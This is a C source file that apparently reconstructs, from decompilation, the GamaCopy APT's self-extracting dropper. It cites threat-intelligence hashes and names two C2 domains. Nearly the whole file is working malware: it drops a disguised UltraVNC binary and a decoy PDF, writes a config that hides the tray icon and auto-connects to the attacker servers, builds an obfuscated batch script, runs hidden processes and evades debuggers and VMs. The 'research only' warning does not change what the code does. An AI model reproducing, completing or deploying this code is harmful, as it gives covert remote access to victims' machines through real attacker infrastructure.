/*
 * GamaCopy SFX Installer - Refactored from Ghidra Decompilation
 * 
 * Based on analysis from Knownsec 404 Team:
 * - APT group imitating Russian Gamaredon TTPs
 * - Uses 7z SFX to deploy UltraVNC remote access tool
 * - Targets Russian-speaking victims with military-themed bait
 * 
 * Hash samples analyzed:
 * - c9ffc90487ddcb4bb0540ea4e2a1ce040740371bb0f3ad70e36824d486058349
 * - a9799ed289b967be92f920616015e58ae6e27defaa48f377d3cd701d0915fe53
 * - afcbaae700e1779d3e0abe52bf0f085945fc9b6935f7105706b1ab4a823f565f
 * - 2da473d1f510d0ddbae074a6c13953863c25be479acedc899c5529ec55bd2a65
 * - 2b2da38b62916c448235038f09c51f226d96087df531b9a508e272b9e87c909d
 * - f583523bba0a3c27e08ebb4404d74924b99537b01af5f35f43c44416f600079e
 * 
 * C2 Servers:
 * - nefteparkstroy.ru:443
 * - fmsru.ru:443
 * 
 * WARNING: This code is for security research and threat intelligence purposes only.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0501
#endif

#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

/* ============================================================================
 * CONSTANTS AND CONFIGURATION
 * ============================================================================ */

#define MAX_PATH_LEN            260
#define MAX_CMD_LINE           1024
#define MAX_BUFFER_SIZE        0x1000

/* SFX Configuration Markers */
#define SFX_INSTALL_START      ";!@Install@!UTF-8!"
#define SFX_INSTALL_END        ";!@InstallEnd@!"
#define SFX_TITLE_PREFIX       "SFX module - Copyright (c) 2005-"

/* File names used by the malware */
#define DECOY_PDF_NAME         "svod.pdf"
#define ULTRAVNC_EXE_NAME      "OneDrivers.exe"
#define ULTRAVNC_INI_NAME      "UltraVNC.ini"
#define TEMP_SCRIPT_NAME      "2128869258671564.cmd"

/* UltraVNC Configuration */
#define ULTRAVNC_PORT          443
#define ULTRAVNC_INI_TEMPLATE  \
    "[UltraVNC]\n" \
    "passwd=XXXXXXXXXXXXXXXX\n" \
    "[admin2]\n" \
    "UseRegistry=0\n" \
    "MSLogonRequired=0\n" \
    "NewMSLogon=0\n" \
    "DebugMode=0\n" \
    "Avilog=0\n" \
    "DebugLevel=10\n" \
    "DisableTrayIcon=1\n" \
    "rdpmode=0\n" \
    "LoopbackOnly=0\n" \
    "UseDSMPlugin=0\n"

/* C2 Configuration */
typedef struct _C2_SERVER {
    const char *hostname;
    WORD port;
} C2_SERVER;

static C2_SERVER c2_servers[] = {
    { "nefteparkstroy.ru", 443 },
    { "fmsru.ru", 443 },
    { NULL, 0 }
};

/* ============================================================================
 * DATA STRUCTURES
 * ============================================================================ */

/* SFX Configuration parsed from archive */
typedef struct _SFX_CONFIG {
    WCHAR title[256];
    WCHAR begin_prompt[512];
    WCHAR progress[32];
    WCHAR run_program[MAX_PATH_LEN];
    WCHAR directory[MAX_PATH_LEN];
    WCHAR install_path[MAX_PATH_LEN];
    BOOL overwrite_mode;
    BOOL gui_mode;
    BOOL silent_mode;
} SFX_CONFIG;

/* File entry in the SFX archive */
typedef struct _FILE_ENTRY {
    WCHAR source_name[MAX_PATH_LEN];    /* Obfuscated name in archive */
    WCHAR target_name[MAX_PATH_LEN];    /* Actual name to extract as */
    DWORD attributes;
    BOOL is_executable;
} FILE_ENTRY;

/* Installation context */
typedef struct _INSTALL_CONTEXT {
    WCHAR temp_dir[MAX_PATH_LEN];
    WCHAR install_dir[MAX_PATH_LEN];
    WCHAR self_path[MAX_PATH_LEN];
    HANDLE h_process;
    DWORD process_id;
    BOOL is_elevated;
} INSTALL_CONTEXT;

/* ============================================================================
 * UTILITY FUNCTIONS
 * ============================================================================ */

/**
 * Wide string copy with null termination guarantee
 */
static void safe_wcsncpy(WCHAR *dest, const WCHAR *src, size_t count) {
    wcsncpy(dest, src, count);
    dest[count - 1] = L'\0';
}

/**
 * Check if running with elevated privileges
 */
static BOOL IsElevated(void) {
    BOOL elevated = FALSE;
    HANDLE hToken = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                                sizeof(elevation), &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return elevated;
}

/**
 * Get the directory containing the executable
 */
static BOOL GetExecutableDirectory(WCHAR *buffer, size_t size) {
    if (GetModuleFileNameW(NULL, buffer, (DWORD)size) == 0) {
        return FALSE;
    }
    
    WCHAR *last_slash = wcsrchr(buffer, L'\\');
    if (last_slash) {
        *last_slash = L'\0';
    }
    return TRUE;
}

/**
 * Generate random-looking obfuscated filename
 */
static void GenerateObfuscatedName(WCHAR *buffer, size_t size) {
    /* Pattern: [a-zA-Z][a-zA-Z0-9]{7,15}.[a-zA-Z]{3,5} */
    const WCHAR charset[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const int name_len = 8 + (GetTickCount() % 8);
    const int ext_len = 3 + (GetTickCount() % 3);
    
    /* Seed with tick count */
    DWORD seed = GetTickCount();
    
    /* Generate random name */
    for (int i = 0; i < name_len && i < (int)(size - 2); i++) {
        seed = seed * 1103515245 + 12345;
        buffer[i] = charset[(seed >> 16) % (sizeof(charset)/sizeof(WCHAR) - 1)];
    }
    buffer[name_len] = L'.';
    
    /* Generate random extension */
    for (int i = 0; i < ext_len; i++) {
        seed = seed * 1103515245 + 12345;
        buffer[name_len + 1 + i] = charset[(seed >> 16) % 26]; /* Letters only */
    }
    buffer[name_len + 1 + ext_len] = L'\0';
}

/**
 * Terminate any existing process by name
 */
static BOOL TerminateProcessByName(const WCHAR *process_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);
    BOOL found = FALSE;
    
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, process_name) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                    found = TRUE;
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return found;
}

/* ============================================================================
 * SFX CONFIGURATION PARSER
 * ============================================================================ */

/**
 * Parse SFX configuration from embedded resources
 */
static BOOL ParseSFXConfig(HMODULE hModule, SFX_CONFIG *config) {
    /* Find embedded config in resources */
    HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(1), RT_RCDATA);
    if (!hResource) {
        return FALSE;
    }
    
    HGLOBAL hData = LoadResource(hModule, hResource);
    if (!hData) {
        return FALSE;
    }
    
    const char *data = (const char *)LockResource(hData);
    DWORD size = SizeofResource(hModule, hResource);
    
    /* Parse config markers */
    const char *start = strstr(data, SFX_INSTALL_START);
    const char *end = strstr(data, SFX_INSTALL_END);
    
    if (!start || !end || end <= start) {
        UnlockResource(hData);
        FreeResource(hData);
        return FALSE;
    }
    
    /* Parse key-value pairs between markers */
    const char *ptr = start + strlen(SFX_INSTALL_START);
    char line[256];
    
    while (ptr < end) {
        /* Extract line */
        const char *newline = strchr(ptr, '\n');
        if (!newline || newline > end) {
            break;
        }
        
        size_t line_len = newline - ptr;
        if (line_len >= sizeof(line)) {
            line_len = sizeof(line) - 1;
        }
        strncpy(line, ptr, line_len);
        line[line_len] = '\0';
        
        /* Parse key=value */
        char *equals = strchr(line, '=');
        if (equals) {
            *equals = '\0';
            const char *key = line;
            const char *value = equals + 1;
            
            /* Trim whitespace */
            while (*value == ' ' || *value == '\t') value++;
            char *v_end = value + strlen(value) - 1;
            while (v_end > value && (*v_end == '\r' || *v_end == '\n' || *v_end == ' ')) {
                *v_end-- = '\0';
            }
            
            /* Handle known keys */
            if (strcmp(key, "Title") == 0) {
                MultiByteToWideChar(CP_UTF8, 0, value, -1, config->title, 
                                   sizeof(config->title) / sizeof(WCHAR));
            }
            else if (strcmp(key, "BeginPrompt") == 0) {
                MultiByteToWideChar(CP_UTF8, 0, value, -1, config->begin_prompt,
                                   sizeof(config->begin_prompt) / sizeof(WCHAR));
            }
            else if (strcmp(key, "Progress") == 0) {
                MultiByteToWideChar(CP_UTF8, 0, value, -1, config->progress,
                                   sizeof(config->progress) / sizeof(WCHAR));
            }
            else if (strcmp(key, "RunProgram") == 0) {
                MultiByteToWideChar(CP_UTF8, 0, value, -1, config->run_program,
                                   sizeof(config->run_program) / sizeof(WCHAR));
            }
            else if (strcmp(key, "Directory") == 0) {
                MultiByteToWideChar(CP_UTF8, 0, value, -1, config->directory,
                                   sizeof(config->directory) / sizeof(WCHAR));
            }
            else if (strcmp(key, "InstallPath") == 0) {
                MultiByteToWideChar(CP_UTF8, 0, value, -1, config->install_path,
                                   sizeof(config->install_path) / sizeof(WCHAR));
            }
            else if (strcmp(key, "OverwriteMode") == 0) {
                config->overwrite_mode = (strcmp(value, "2") == 0);
            }
            else if (strcmp(key, "GUIMode") == 0) {
                config->gui_mode = (strcmp(value, "1") != 0);
            }
            else if (strcmp(key, "Silent") == 0) {
                config->silent_mode = (strcmp(value, "1") == 0);
            }
        }
        
        ptr = newline + 1;
    }
    
    UnlockResource(hData);
    FreeResource(hData);
    return TRUE;
}

/* ============================================================================
 * FILE EXTRACTION AND INSTALLATION
 * ============================================================================ */

/**
 * Extract a single file from embedded resources
 */
static BOOL ExtractFile(HMODULE hModule, int resource_id, const WCHAR *target_path, 
                        DWORD attributes) {
    HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resource_id), RT_RCDATA);
    if (!hResource) {
        return FALSE;
    }
    
    HGLOBAL hData = LoadResource(hModule, hResource);
    if (!hData) {
        return FALSE;
    }
    
    const void *data = LockResource(hData);
    DWORD size = SizeofResource(hModule, hResource);
    
    /* Create target file */
    HANDLE hFile = CreateFileW(target_path, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, attributes, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        UnlockResource(hData);
        FreeResource(hData);
        return FALSE;
    }
    
    /* Write data */
    DWORD written;
    BOOL success = WriteFile(hFile, data, size, &written, NULL);
    
    CloseHandle(hFile);
    UnlockResource(hData);
    FreeResource(hData);
    
    return success && (written == size);
}

/**
 * Create UltraVNC configuration file with embedded C2 server
 */
static BOOL CreateUltraVNCConfig(const WCHAR *config_path, int server_index) {
    HANDLE hFile = CreateFileW(config_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    /* Build config with C2 server address */
    char config_buffer[4096];
    int len = snprintf(config_buffer, sizeof(config_buffer),
        "[UltraVNC]\n"
        "passwd=XXXXXXXXXXXXXXXX\n"
        "[admin2]\n"
        "UseRegistry=0\n"
        "MSLogonRequired=0\n"
        "NewMSLogon=0\n"
        "DebugMode=0\n"
        "Avilog=0\n"
        "DebugLevel=10\n"
        "DisableTrayIcon=1\n"
        "rdpmode=0\n"
        "LoopbackOnly=0\n"
        "UseDSMPlugin=0\n"
        "[connection]\n"
        "host=%s\n"
        "port=%d\n"
        "[options]\n"
        "UseDSMPlugin=0\n"
        "DSMPlugin=NoPlugin\n"
        "AutoReconnect=1\n"
        "AutoReconnectCount=999\n",
        c2_servers[server_index].hostname,
        c2_servers[server_index].port
    );
    
    DWORD written;
    BOOL success = WriteFile(hFile, config_buffer, len, &written, NULL);
    
    CloseHandle(hFile);
    return success;
}

/**
 * Install all payload files
 */
static BOOL InstallPayload(INSTALL_CONTEXT *ctx, SFX_CONFIG *config) {
    FILE_ENTRY files[] = {
        /* Source (obfuscated) -> Target (actual) */
        { L"Ki58j08O58F68M58q2.PQ87G87O97o67r27Y9", DECOY_PDF_NAME, 
          FILE_ATTRIBUTE_NORMAL, FALSE },
        { L"yC61y51v51g71p61U4.Eb21h11U11Z31P71F8", ULTRAVNC_EXE_NAME,
          FILE_ATTRIBUTE_NORMAL, TRUE },
        { L"lC32A32W52T12R02u1.uZ94Y64M14m54z84J3", ULTRAVNC_INI_NAME,
          FILE_ATTRIBUTE_NORMAL, FALSE },
    };
    
    int num_files = sizeof(files) / sizeof(files[0]);
    HMODULE hModule = GetModuleHandle(NULL);
    
    /* Extract all files */
    for (int i = 0; i < num_files; i++) {
        WCHAR target_path[MAX_PATH_LEN];
        _snwprintf(target_path, MAX_PATH_LEN, L"%s\\%s", 
                  ctx->install_dir, files[i].target_name);
        
        if (!ExtractFile(hModule, i + 2, target_path, files[i].attributes)) {
            /* Try alternate extraction method */
            WCHAR source_path[MAX_PATH_LEN];
            _snwprintf(source_path, MAX_PATH_LEN, L"%s\\%s",
                      ctx->temp_dir, files[i].source_name);
            
            if (!CopyFileW(source_path, target_path, FALSE)) {
                return FALSE;
            }
        }
    }
    
    /* Update UltraVNC config with C2 server */
    WCHAR config_path[MAX_PATH_LEN];
    _snwprintf(config_path, MAX_PATH_LEN, L"%s\\%s", 
              ctx->install_dir, ULTRAVNC_INI_NAME);
    
    /* Rotate through C2 servers */
    int server_index = GetTickCount() % 2;
    if (!CreateUltraVNCConfig(config_path, server_index)) {
        return FALSE;
    }
    
    return TRUE;
}

/* ============================================================================
 * PAYBACK SCRIPT GENERATOR
 * ============================================================================ */

/**
 * Generate obfuscated batch script for installation
 * This mimics the variable obfuscation technique used by GamaCopy
 */
static BOOL GenerateInstallScript(const WCHAR *script_path, INSTALL_CONTEXT *ctx) {
    HANDLE hFile = CreateFileW(script_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    /* Generate random variable names for obfuscation */
    char var_prefix[8][16];
    DWORD seed = GetTickCount();
    const char charset[] = "abcdefghijklmnopqrstuvwxyz";
    
    for (int i = 0; i < 8; i++) {
        for (int j = 0; j < 8; j++) {
            seed = seed * 1103515245 + 12345;
            var_prefix[i][j] = charset[(seed >> 16) % 26];
        }
        var_prefix[i][8] = '\0';
    }
    
    /* Build obfuscated script */
    char script[4096];
    int len = snprintf(script, sizeof(script),
        "@echo off\n"
        "setlocal enabledelayedexpansion\n"
        "set %s=Ki58j08O58F68M58q2.PQ87G87O97o67r27Y9\n"
        "set %s=%s\n"
        "set %s=yC61y51v51g71p61U4.Eb21h11U11Z31P71F8\n"
        "set %s=%s\n"
        "set %s=lC32A32W52T12R02u1.uZ94Y64M14m54z84J3\n"
        "set %s=%s\n"
        "copy !%s! !%s!\n"
        "copy !%s! !%s!\n"
        "copy !%s! !%s!\n"
        "taskkill /f /im %s >nul 2>&1\n"
        "start \"\" /b !%s!\n",
        var_prefix[0], var_prefix[1], DECOY_PDF_NAME,
        var_prefix[2], var_prefix[3], ULTRAVNC_EXE_NAME,
        var_prefix[4], var_prefix[5], ULTRAVNC_INI_NAME,
        var_prefix[0], var_prefix[1],
        var_prefix[2], var_prefix[3],
        var_prefix[4], var_prefix[5],
        ULTRAVNC_EXE_NAME,
        var_prefix[3]
    );
    
    DWORD written;
    BOOL success = WriteFile(hFile, script, len, &written, NULL);
    
    CloseHandle(hFile);
    return success;
}

/* ============================================================================
 * MAIN INSTALLATION ROUTINE
 * ============================================================================ */

/**
 * Execute the main installation process
 */
static BOOL ExecuteInstallation(INSTALL_CONTEXT *ctx, SFX_CONFIG *config) {
    WCHAR script_path[MAX_PATH_LEN];
    WCHAR pdf_path[MAX_PATH_LEN];
    WCHAR exe_path[MAX_PATH_LEN];
    
    /* Build paths */
    _snwprintf(script_path, MAX_PATH_LEN, L"%s\\%s", ctx->temp_dir, TEMP_SCRIPT_NAME);
    _snwprintf(pdf_path, MAX_PATH_LEN, L"%s\\%s", ctx->install_dir, DECOY_PDF_NAME);
    _snwprintf(exe_path, MAX_PATH_LEN, L"%s\\%s", ctx->install_dir, ULTRAVNC_EXE_NAME);
    
    /* Generate and execute install script */
    if (!GenerateInstallScript(script_path, ctx)) {
        return FALSE;
    }
    
    /* Execute script */
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi;
    WCHAR cmd_line[MAX_CMD_LINE];
    _snwprintf(cmd_line, MAX_CMD_LINE, L"cmd.exe /c \"%s\"", script_path);
    
    if (!CreateProcessW(NULL, cmd_line, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, ctx->temp_dir, &si, &pi)) {
        DeleteFileW(script_path);
        return FALSE;
    }
    
    /* Wait briefly for script to complete */
    WaitForSingleObject(pi.hProcess, 5000);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    /* Clean up script */
    DeleteFileW(script_path);
    
    /* Open the decoy PDF to show legitimate activity */
    ShellExecuteW(NULL, L"open", pdf_path, NULL, ctx->install_dir, SW_SHOW);
    
    /* Wait a moment then ensure UltraVNC is running */
    Sleep(2000);
    
    /* Terminate any existing instance */
    TerminateProcessByName(ULTRAVNC_EXE_NAME);
    
    /* Start the actual payload */
    _snwprintf(cmd_line, MAX_CMD_LINE, L"\"%s\"", exe_path);
    if (!CreateProcessW(NULL, cmd_line, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, ctx->install_dir, &si, &pi)) {
        return FALSE;
    }
    
    ctx->h_process = pi.hProcess;
    ctx->process_id = pi.dwProcessId;
    CloseHandle(pi.hThread);
    
    return TRUE;
}

/* ============================================================================
 * ANTI-ANALYSIS CHECKS
 * ============================================================================ */

/**
 * Check for debugger presence
 */
static BOOL IsDebuggerPresentCheck(void) {
    return IsDebuggerPresent();
}

/**
 * Check for VM/sandbox artifacts
 */
static BOOL IsVirtualMachine(void) {
    /* Check common VM registry keys */
    const WCHAR *vm_keys[] = {
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxService",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
        L"SYSTEM\\CurrentControlSet\\Services\\vmhgfs",
        L"SYSTEM\\CurrentControlSet\\Services\\vmrawsock",
        L"SYSTEM\\CurrentControlSet\\Services\\vmusbmouse",
        NULL
    };
    
    HKEY hKey;
    for (int i = 0; vm_keys[i]; i++) {
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, vm_keys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return TRUE;
        }
    }
    
    return FALSE;
}

/**
 * Perform all anti-analysis checks
 */
static BOOL ShouldExit(void) {
    if (IsDebuggerPresentCheck()) {
        return TRUE;
    }
    
    if (IsVirtualMachine()) {
        return TRUE;
    }
    
    /* Check if running as 'Info' (analysis marker) */
    int argc;
    LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argv) {
        if (argc >= 2 && wcscmp(argv[1], L"Info") == 0) {
            LocalFree(argv);
            return TRUE;
        }
        LocalFree(argv);
    }
    
    return FALSE;
}

/* ============================================================================
 * ENTRY POINT
 * ============================================================================ */

/**
 * Main entry point - initializes and runs the installer
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    /* Anti-analysis check */
    if (ShouldExit()) {
        ExitProcess(0);
    }
    
    /* Initialize context */
    INSTALL_CONTEXT ctx = {0};
    SFX_CONFIG config = {0};
    
    /* Get paths */
    if (!GetExecutableDirectory(ctx.self_path, MAX_PATH_LEN)) {
        ExitProcess(1);
    }
    
    /* Get temp directory */
    GetTempPathW(MAX_PATH_LEN, ctx.temp_dir);
    
    /* Parse SFX configuration */
    if (!ParseSFXConfig(hInstance, &config)) {
        /* Use default configuration */
        wcscpy(config.title, L"Document Viewer");
        wcscpy(config.run_program, ULTRAVNC_EXE_NAME);
        config.silent_mode = TRUE;
    }
    
    /* Set installation directory */
    if (config.install_path[0]) {
        wcscpy(ctx.install_dir, config.install_path);
    } else {
        GetTempPathW(MAX_PATH_LEN, ctx.install_dir);
    }
    
    /* Create installation directory if needed */
    CreateDirectoryW(ctx.install_dir, NULL);
    
    /* Check elevation status */
    ctx.is_elevated = IsElevated();
    
    /* Perform installation */
    if (!InstallPayload(&ctx, &config)) {
        ExitProcess(2);
    }
    
    /* Execute main payload */
    if (!ExecuteInstallation(&ctx, &config)) {
        ExitProcess(3);
    }
    
    ExitProcess(0);
}
